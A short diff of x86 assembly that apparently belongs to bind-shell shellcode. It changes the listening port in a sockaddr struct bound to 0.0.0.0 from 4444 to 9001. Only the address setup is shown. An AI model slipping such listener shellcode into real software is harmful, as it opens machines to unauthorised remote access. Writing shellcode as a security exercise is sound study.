@@ -35,7 +35,7 @@ _start:
 	; sockaddr struct	
 	;push edx
 	push edx	; 0.0.0.0
-	push word 0x5C11 ;little endian -> 9001 = 0x2329
+	push word 0x2923 ;little endian -> 9001 = 0x2329
 	push word 0x2
 	mov ecx, esp
 	
